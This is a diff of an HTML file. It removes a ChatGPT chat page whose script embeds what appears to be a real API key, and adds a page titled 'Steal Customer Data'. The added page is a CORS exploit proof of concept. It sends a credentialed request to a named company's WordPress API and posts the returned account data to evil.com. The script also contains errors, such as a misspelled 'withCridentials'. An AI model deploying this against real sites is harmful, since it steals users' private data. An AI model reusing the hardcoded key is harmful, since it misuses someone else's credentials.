@@ -1,162 +1,29 @@
-v<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ChatGPT Integration</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-        }
-
-        header {
-            background-color: #333;
-            color: #fff;
-            padding: 20px;
-            text-align: center;
-        }
-
-        main {
-            display: flex;
-            justify-content: space-between;
-            padding: 20px;
-        }
-
-        #chatInterface {
-            flex: 1;
-            max-width: 70%;
-            border: 2px solid #ccc;
-            border-radius: 5px;
-            padding: 10px;
-            box-sizing: border-box;
-        }
-
-        #chatWindow {
-            height: 300px;
-            overflow-y: auto;
-            margin-bottom: 10px;
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            background-color: #f9f9f9;
-        }
-
-        #userInput {
-            width: calc(100% - 70px);
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 5px 0 0 5px;
-            box-sizing: border-box;
-            outline: none;
-        }
-
-        #sendMessage {
-            width: 70px;
-            padding: 10px;
-            background-color: #333;
-            color: #fff;
-            border: none;
-            border-radius: 0 5px 5px 0;
-            cursor: pointer;
-            outline: none;
-        }
-
-        #robotFace {
-            flex: 1;
-            max-width: 30%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background-color: #f9f9f9;
-            border: 2px solid #ccc;
-            border-radius: 5px;
-            padding: 20px;
-            box-sizing: border-box;
-        }
-    </style>
+    <title>Steal Customer Data</title>
+  
 </head>
 <body>
-    <!-- Header Section -->
-    <header>
-        <h1>ChatGPT Integration</h1>
-    </header>
-
-    <!-- Main Content Section -->
-    <main>
-        <!-- Chat Interface -->
-        <div id="chatInterface">
-            <!-- Chat Window -->
-            <div id="chatWindow">
-                <!-- Chat Messages will appear here -->
-            </div>
-            <!-- User Input -->
-            <input type="text" id="userInput" placeholder="Type your message...">
-            <button id="sendMessage">Send</button>
-        </div>
-
-        <!-- Robot Response -->
-        <div id="robotFace">
-            <!-- Robot response will appear here -->
-        </div>
-    </main>
-
-    <!-- JavaScript Code -->
+    <button type="button" onclick="cors()" class="btton" ></button>
     <script>
-        // Handle sending messages
-document.getElementById('sendMessage').addEventListener('click', function() {
-    var userInput = document.getElementById('userInput').value;
-    if (userInput.trim() !== '') {
-        appendMessage('user', userInput);
-        // Send user input to ChatGPT API
-        fetch('https://api.openai.com/v1/completions', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'Authorization': 'Bearer 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' // Replace YOUR_API_KEY with your actual API key
-            },
-            body: JSON.stringify({
-                model: 'text-davinci-003', // Model name or ID
-                prompt: userInput,
-                max_tokens: 150
-            })
-        })
-        .then(response => response.json())
-        .then(data => {
-            // Handle API response
-            var robotResponse = data.choices[0].text.trim();
-            appendMessage('robot', robotResponse);
-        })
-        .catch(error => {
-            console.error('Error:', error);
-        });
-        // Clear user input field
-        document.getElementById('userInput').value = '';
+    function cors(){
+        var xhttp = new XMLhttpRequest();
+        xhttp.onreadystatechange = function(){
+            if(this.readyState == 4 && this.status == 200) {
+                var a = this.responseText ; // Sensitive data from user account
+                document.getElementById("demo").innerHTML =a;
+                xhttp.open("POST","http://evil.com",true);// Sending that data to Attacker's website
+                console.log(a);
+                xhttp.send("data ="+a);
+            }
+        };
+        xhttp.open("POST","http://backend.blog.nubank.com.br/wp-json/",true);
+        xhttp.withCridentials = true;
+        xhttp.send();
     }
-});
-
-// Function to append messages to the chat window
-function appendMessage(sender, message) {
-    var chatWindow = document.getElementById('chatWindow');
-    var messageElement = document.createElement('div');
-    messageElement.classList.add(sender);
-    messageElement.textContent = message;
-    chatWindow.appendChild(messageElement);
-    // Scroll to bottom of chat window
-    chatWindow.scrollTop = chatWindow.scrollHeight;
-}
-
-        // Function to append messages to the chat window
-        function appendMessage(sender, message) {
-            var chatWindow = document.getElementById('chatWindow');
-            var messageElement = document.createElement('div');
-            messageElement.classList.add(sender);
-            messageElement.textContent = message;
-            chatWindow.appendChild(messageElement);
-            // Scroll to bottom of chat window
-            chatWindow.scrollTop = chatWindow.scrollHeight;
-        }
     </script>
 </body>
 </html>
